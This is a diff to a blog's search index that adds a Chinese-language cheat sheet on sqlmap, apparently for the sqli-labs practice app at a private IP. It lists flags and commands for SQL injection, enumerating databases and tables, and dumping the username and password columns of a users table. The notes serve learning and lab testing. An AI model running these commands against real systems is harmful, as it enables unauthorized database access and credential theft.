@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>sqlmap自动化注入</title>
+      <link href="/2020/04/27/sqlmap/"/>
+      <url>/2020/04/27/sqlmap/</url>
+      
+        <content type="html"><![CDATA[<h2 id="sqlmap自动化注入"><a href="#sqlmap自动化注入" class="headerlink" title="sqlmap自动化注入"></a>sqlmap自动化注入</h2><p>–batch：中间避免手动输入y来确认，自动化完成</p><p>–users:    所有用户</p><p>–current-user：当前用户</p><p>–dbs：所有数据库</p><p>–current-db：当前数据库</p><p>-D “database_name” –tables：查看当前数据库的表</p><p>-D “database_name” -T “table_name” –columns：查看当前数据库的数据表的列</p><p>–dump-all：存储所有数据库</p><p>–dump-all –exclude-sysdbs：存储除系统库外的所有数据库</p><p>-D ”database_name“ -T “table_name” –dump：存储当前数据库的数据表</p><p>-D ”database_name“ -T “table_name” -C “username,password” –dump：存储当前数据的数据表的列的用户名和密码</p><p>-g</p><p>-hh</p><p>-u：url的缩写代表测试后面的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1   查看页面有没有注入点</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dbs   爆出所有数据库</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --current-db --current-use</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --tables -D security   爆security数据库的表</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --columns -T users -D security  爆security数据库的users的表里面的列</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dump -C password,username -T users -D security</span><br><span class="line">  爆security数据库的users的表里面的列的password,username数据信息</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 - 注入漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>微信运动步数修改</title>
       <link href="/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/"/>
       <url>/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/</url>
